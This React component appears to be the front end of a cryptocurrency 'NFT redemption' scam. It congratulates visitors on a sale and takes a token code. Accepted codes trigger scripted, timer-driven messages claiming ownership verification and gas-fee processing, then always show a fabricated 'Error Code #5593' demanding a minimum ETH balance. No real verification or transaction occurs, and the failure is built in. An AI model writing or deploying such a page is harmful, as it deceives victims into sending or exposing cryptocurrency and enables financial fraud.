import { useState, useRef, useEffect } from "react"
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome"
import { faSpinner } from "@fortawesome/free-solid-svg-icons"

const NftRedeem = () => {
    const [token, setToken] = useState('')
    const [redeemTab, setRedeemTab] = useState(false)
    const [txMsg, setTxMsg] = useState(null)
    const [displayCard, setDisplayCard] = useState('')
    const [result, setResult] = useState(null)
    const [loading, setLoading] = useState(false)
    const tabRef = useRef()

    useEffect(() => {
        if (redeemTab) {
            tabRef.current.scrollIntoView({ behavior: 'smooth' })
        }
    }, [redeemTab])

    const imgSrc = (code) => {
        switch (code) {
            case '330106':
                return 'assets/1 eth.jpg'
            case '330107':
                return 'assets/2 eth.jpg'
            case '330108':
                return 'assets/3 eth.jpg'
            case '330109':
                return 'assets/4 eth.jpg'
            case '330110':
                return 'assets/5 eth.jpg'
            case '330111':
                return 'assets/6 eth.jpg'
            case '330112':
                return 'assets/7 eth.jpg'
            case '330113':
                return 'assets/8 eth.jpg'
            case '330114':
                return 'assets/9 eth.jpg'
            case '330115':
                return 'assets/10 eth.jpg'
            default:
                break;
        }
    }

    let ct
    const onRedeemClicked = (e) => {
        e.preventDefault()
        setDisplayCard(null)
        setRedeemTab(null)
        setResult(null)
        setTxMsg(null)
        if (!token) return alert('No token detected: please input the Nft token')
        ct = Number(token)
        console.log(ct);
        if (ct === 330106 || ct === 330107 || ct === 330108 || ct === 330109 || ct === 330110 || ct === 330111 || ct === 330112 || ct === 330113 || ct === 330114 || ct === 330115) {
            setLoading(true)
            setRedeemTab(true)
            setTxMsg('Loading...')
            setTimeout(() => {
                setDisplayCard(imgSrc(token))
                setTxMsg('Verifying ownership and authenticity...')
            }, 3000)
            setTimeout(() => {
                setTxMsg('Preparing your transaction...')
            }, 5000)
            setTimeout(() => {
                setTxMsg('Processing network fees and gas fees...')
            }, 8000)
            setTimeout(() => {
                setTxMsg(null)
                setResult(true)
            }, 15000)
            setLoading(false)
        } else {
            return alert('This is an invalid code. Please provide a valid code.')
        }
    }

    const minBalance = (val) => {
        switch (val) {
            case '330106':
                return 0.1
            case '330107':
                return 0.2
            case '330108':
                return 0.3
            case '330109':
                return 0.4
            case '330110':
                return 0.5
            case '330111':
                return 0.6
            case '330112':
                return 0.7
            case '330113':
                return 0.8
            case '330114':
                return 0.9
            case '330115':
                return 1
            default:
                break;
        }
    }


    return (
        <main className="bg-white dark:bg-black/90 flex flex-col items-center min-h-screen">
            <section className="max-w-4xl mx-auto p-4 flex flex-col items-center ">
                <h2 className="text-4xl font-medium dark:text-white text-center"> <img className="inline w-[36px] h-[36px] pb-1" src="assets/confettigif.gif" alt="" /> Congratulations on your successful sale.</h2>
                <p className="dark:text-white text-center mb-2"> Please provide the code sent along with the NFT token down in the input field below:</p>
                <form onSubmit={onRedeemClicked} className="w-full max-w-[200px] sm:max-w-[400px] mx-auto flex flex-col">
                    <label htmlFor="token" className="dark:text-white text-xl mt-12">
                        NFT Token Code:
                    </label>
                    <input
                        type="text"
                        name="token"
                        id="token"
                        placeholder="Token e.g #049133"
                        className="dark:text-white p-2 w-full border border-solid dark:border-gray-300 rounded-xl border-gray-500 bg-transparent placeholder:text-gray-600 *:placeholder:text-[12px] focus:outline-none"
                        onChange={e => setToken(e.target.value)}
                        value={token}
                        readOnly={loading}
                    />
                    <button className="bg-indigo-600 text-white mt-4 p-2 rounded-xl text-[20px] hover:bg-indigo-500 transition-all duration-300">
                        Redeem
                    </button>
                </form>
                {redeemTab && <div ref={tabRef} className={`sm:w-[400px] w-[280px]  min-h-[400px] bg-gray-200 rounded-xl shadow-xl mt-12 flex flex-col items-center justify-center ${redeemTab ? 'opacity-100' : 'opacity-0'} transition-all duration-1000`}>
                    {displayCard && <img className="sm:w-[300px] w-[250px] h-[250px] sm:h-[300px] rounded-xl shadow-xl mx-auto" src={displayCard || null} alt="redeem card" />}
                    {txMsg && <h3 className=" mt-2 text-black text-2xl text-center font-medium">                         <FontAwesomeIcon className="text-2xl mr-3" icon={faSpinner} spinPulse />
                        {txMsg} </h3>}
                    {result &&
                        <>
                            <h4 className="text-xl font-semibold text-red-800 text-center underline">Error Code #5593</h4>
                            <p className="text-[17px] text-red-600 text-center p-3"> Oops! It looks like your transaction failed due to insufficient funds to cover the gas fee. Please ensure your wallet has a minimum balance of  <b>{minBalance(token)} ETH</b> to complete the transaction. If you need assistance, feel free to reach out to our support team for further guidance. </p>
                        </>
                    }
                </div>}
            </section>
        </main>
    )
}
export default NftRedeem